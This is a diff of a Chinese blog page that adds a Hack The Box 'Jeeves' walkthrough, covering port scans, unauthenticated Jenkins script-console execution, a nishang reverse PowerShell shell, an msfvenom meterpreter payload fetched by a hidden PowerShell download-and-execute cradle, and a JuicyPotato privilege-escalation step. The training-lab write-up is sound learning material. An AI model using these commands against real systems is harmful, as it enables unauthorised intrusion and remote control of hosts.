@@ -5,8 +5,8 @@
   <meta name="Volantis" content="6.0.0-alpha.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="index,follow">
-  <link rel="canonical" href="http://example.com/"/>
+  
+  <link rel="canonical" href="http://example.com/2023/08/20/htb-jeeves/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,16 +33,26 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Yao</title>
-  <meta name="keywords" content="">
+  <title>HTB-Jeeves - Yao</title>
+  <meta name="keywords" content="HTB,windows,juicy potato,nishang,jenkins,RCE,null">
   <meta desc name="description" content="Yao - Yao - Yao">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Yao">
-<meta property="og:url" content="http://example.com/index.html">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Jeeves">
+<meta property="og:url" content="http://example.com/2023/08/20/HTB-Jeeves/index.html">
 <meta property="og:site_name" content="Yao">
+<meta property="og:description" content="Information&amp;#x20;Port Scan使用nmap来做全端口扫描 1234567891011121314┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;htb]└─$ nmap -p- --min-rate 10000 10.10.10.63Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-19 07:41 EDTNmap">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2023-08-20T05:35:32.000Z">
+<meta property="article:modified_time" content="2023-08-20T07:18:38.295Z">
 <meta property="article:author" content="Yao">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="juicy potato">
+<meta property="article:tag" content="nishang">
+<meta property="article:tag" content="jenkins">
+<meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2234,7 +2244,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2299,7 +2309,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin begin-->
     
     <!-- Custom Files bodyBegin end-->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2532,106 +2542,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div id="l_body">
       <div id="l_cover">
   
-    
-      <div class="cover-wrapper  dock" id='full'>
-        
-  <div id="parallax-window"></div>
-
-<div class='cover-body'>
-  <div class='top'>
-    
-    
-      <p class="title">Yao's blog</p>
-    
-    
-      <p class="subtitle">改卷的时候卷，才有躺的机会</p>
-    
-  </div>
-  <div class='bottom'>
-    <div class='menu navigation'>
-      <div class='list-h'>
-        
-          
-            <a href="/"
-              
-              
-              active-action="action-home">
-              <i class='fa-solid fa-rss fa-fw'></i><p>博客</p>
-            </a>
-          
-            <a href="/categories/"
-              
-              
-              active-action="action-categories">
-              <i class='fa-solid fa-folder-open fa-fw'></i><p>分类</p>
-            </a>
-          
-            <a href="/tags/"
-              
-              
-              active-action="action-tags">
-              <i class='fa-solid fa-tags fa-fw'></i><p>标签</p>
-            </a>
-          
-            <a href="/archives/"
-              
-              
-              active-action="action-archives">
-              <i class='fa-solid fa-archive fa-fw'></i><p>归档</p>
-            </a>
-          
-            <a href="/about/"
-              
-              
-              active-action="action-about">
-              <i class='fa-solid fa-info-circle fa-fw'></i><p>关于</p>
-            </a>
-          
-        
-      </div>
-    </div>
-  </div>
-</div>
-
-        <div id="scroll-down"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
-      </div>
-    
-  
 </div>
 
       <div id="safearea">
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-  
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
   <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/20/HTB-Jeeves/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Yao">
@@ -2641,182 +2558,272 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2023/08/20/HTB-Jeeves/"  itemprop="url">
+    
+    
+      <h1 class="title" itemprop="name headline">
         HTB-Jeeves
-      </a>
-    </h2>
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">Yao</p>
+  </a>
+</div>
+
+          
+        
+          
+            
   
-  <div class='md article-desc' itemprop="articleBody">
+  
+  
+  <div class='new-meta-item category'>
+    <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/HTB/">HTB</a>
     
-      
-        Information&#x20;Port Scan使用nmap来做全端口扫描
-1234567891011121314┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -p- --min-rate 10000 10.10.10.63Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 07:41 EDTNm...
-      
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/HTB/" itemprop="url"><span itemprop="name">HTB</span></a>
+      </span>
     
   </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2023-08-20T13:35:32+08:00">2023-08-20</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/HTB/">HTB</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/HTB/" itemprop="url"><span itemprop="name">HTB</span></a>
-            </span>
+
+
+
           
         
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-08-20T13:35:32+08:00">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2023年8月20日</p>
+  </a>
+</div>
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
       </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <div class="story post-story"><h2 id="Information-x20"><a href="#Information-x20" class="headerlink" title="Information&#x20;"></a>Information&#x20;</h2><h3 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h3><p>使用nmap来做全端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/htb]</span><br><span class="line">└─$ nmap -p- --min-rate 10000 10.10.10.63</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 07:41 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.63    </span><br><span class="line">Host is up (0.27s latency).                                                                             </span><br><span class="line">Not shown: 65531 filtered tcp ports (no-response)   </span><br><span class="line">PORT      STATE SERVICE                                                                                 </span><br><span class="line">80/tcp    open  http                                </span><br><span class="line">135/tcp   open  msrpc                                                                                   </span><br><span class="line">445/tcp   open  microsoft-ds                                                                            </span><br><span class="line">50000/tcp open  ibm-db2                                                                                 </span><br><span class="line">                                                    </span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 54.80 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>针对开放端口做详细的扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/htb]</span><br><span class="line">└─$ nmap -sC -sV -p 80,135,445,50000 10.10.10.63     </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 07:56 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.63</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Ask Jeeves</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">50000/tcp open  http         Jetty 9.4.z-SNAPSHOT</span><br><span class="line">|_http-title: Error 404 Not Found</span><br><span class="line">|_http-server-header: Jetty(9.4.z-SNAPSHOT)</span><br><span class="line">Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2023-08-19T16:56:42</span><br><span class="line">|_  start_date: 2023-08-19T16:40:30</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 51.06 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>已知运行服务为<code>Microsoft IIS httpd 10.0</code>，那么系统可能为<code>windows10 </code>或<code>windows Server 2016</code>及以上版本。</p>
+<h3 id="WEB-80"><a href="#WEB-80" class="headerlink" title="WEB-80"></a>WEB-80</h3><p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_kJ_HzxpzJo.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_kJ_HzxpzJo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>输入内容并提交表单，得到信息如下：</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_uMTIf-NAfs.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_uMTIf-NAfs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>通过查看源码可以发现当前响应为图片。</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_7prvQBiOdR.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_7prvQBiOdR.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h3 id="WEB-50000"><a href="#WEB-50000" class="headerlink" title="WEB - 50000"></a>WEB - 50000</h3><p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_MfdF_OfKLl.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_MfdF_OfKLl.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/htb]                                                                                                      </span><br><span class="line">└─$ gobuster <span class="built_in">dir</span> -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30                     </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.5</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.63:50000</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 30</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.5</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/08/20 00:54:36 Starting gobuster <span class="keyword">in</span> directory enumeration mode </span><br><span class="line">===============================================================</span><br><span class="line">/askjeeves            (Status: 302) [Size: 0] [--&gt; http://10.10.10.63:50000/askjeeves/]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+</div><div class="story post-story"><h2 id="WEB-x20"><a href="#WEB-x20" class="headerlink" title="WEB&#x20;"></a>WEB&#x20;</h2><p>根据对50000端口的目录遍历得到的结果，访问&#x2F;askjeeves目录</p>
+<h3 id="jenkins-RCE"><a href="#jenkins-RCE" class="headerlink" title="jenkins RCE"></a>jenkins RCE</h3><p>访问<a target="_blank" rel="noopener" href="http://10.10.10.63:50000/askjeeves/" title="http://10.10.10.63:50000/askjeeves/">http://10.10.10.63:50000/askjeeves/</a></p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_xqnBGgITm2.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_xqnBGgITm2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>此处有jenkins未授权访问漏洞</p>
+<p>选择”manage Jenkins”- - &gt; “Script  Console”</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image__Xk1v8_fVB.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image__Xk1v8_fVB.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_7HWYyKUeQ-.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_7HWYyKUeQ-.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>输入poc进行测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&quot;whoami&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_dM-WPMrwAM.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_dM-WPMrwAM.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>成功执行命令，那么下一步便是获取shell</p>
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang" title="nishang">nishang</a>获取shell，将nishang复制到当前目录并修改文件，在文件的最后添加如下内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 1234</span><br></pre></td></tr></table></figure>
+
+<p>修改好文件之后，利用python开始web服务同时使用nc监听1234端口，即可得到shell。</p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_67SNlS_6b3.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_67SNlS_6b3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+</div><div class="story post-story"><h2 id="Privilege"><a href="#Privilege" class="headerlink" title="Privilege"></a>Privilege</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\.jenkins&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State   </span><br><span class="line">============================= ========================================= ========</span><br><span class="line">SeShutdownPrivilege           Shut down the system                      Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class="line">SeUndockPrivilege             Remove computer from docking station      Disabled</span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span>            Disabled</span><br><span class="line">SeTimeZonePrivilege           Change the time zone                      Disabled</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>尝试使用JuicyPotato 进行提权</p>
+<h3 id="To-msf-shell"><a href="#To-msf-shell" class="headerlink" title="To msf shell"></a>To msf shell</h3><p><strong># 这一步可以不做</strong></p>
+<p>将ps1 shell转换成msf shell，先利用msfvenom生成shellcode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=1235  -f psh-reflection &gt;1.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_p_D9JMipfd.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_p_D9JMipfd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>开启http服务提供下载功能</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 808</span><br></pre></td></tr></table></figure>
+
+<p>msfconsole开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LhOST 10.10.14.12</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 1235</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>在目标机执行msfvenom生成的shellcode</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell -windowstyle hidden -<span class="built_in">exec</span> bypass -c <span class="string">&quot;IEX (New-Object Net.WebCli</span></span><br><span class="line"><span class="string">ent).DownloadString(&#x27;http://10.10.14.12:808/1.ps1&#x27;);1.ps1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_jtkECB1J-c.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_jtkECB1J-c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h3 id="JuicyPotato"><a href="#JuicyPotato" class="headerlink" title="JuicyPotato"></a>JuicyPotato</h3><p>使用juicyPotato提权，不过相较Bounty靶机的不同，jeeves获取的权限是不一致的，需要修改-t参数，因为只有SeImpersonatePrivilege 权限，需要将-t参数设置为<code>-t t</code>，具体参考<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato" title="juicy potato">juicy potato</a></p>
+<p><img src="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_1YnfpY4htw.png" class="lazyload" data-srcset="https://bzyfjb-pic.oss-cn-beijing.aliyuncs.com/image_1YnfpY4htw.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+
+</div>
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2023/08/20/HTB-Jeeves/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-08-20T15:18:38+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2023年8月20日</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/17/HTB-Bounty/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Yao">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Yao">
-    <meta itemprop="description" content="">
-  </span>
+          
   
   
   
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/HTB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>HTB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/windows/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>windows</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/juicy-potato/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>juicy potato</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/nishang/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>nishang</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/jenkins/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>jenkins</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/RCE/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>RCE</p></a></div>
+  <span hidden itemprop="keywords">HTB windows juicy potato nishang jenkins RCE</span>
+  
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2023/08/20/HTB-Jeeves/&title=HTB-Jeeves - Yao&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2023/08/20/HTB-Jeeves/&title=HTB-Jeeves - Yao&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2023/08/20/HTB-Jeeves/&title=HTB-Jeeves - Yao&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2023/08/17/HTB-Bounty/'>
+          <p class='title'>HTB-Bounty<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Informationnmap1234567891011┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -p- --min-rate 10000 10.10.1...</p>
+        </a>
+      
+    </div>
+  
+  <!-- 文章推荐 -->
+  
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2023/08/20/HTB-Jeeves/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2023/08/17/HTB-Bounty/"  itemprop="url">
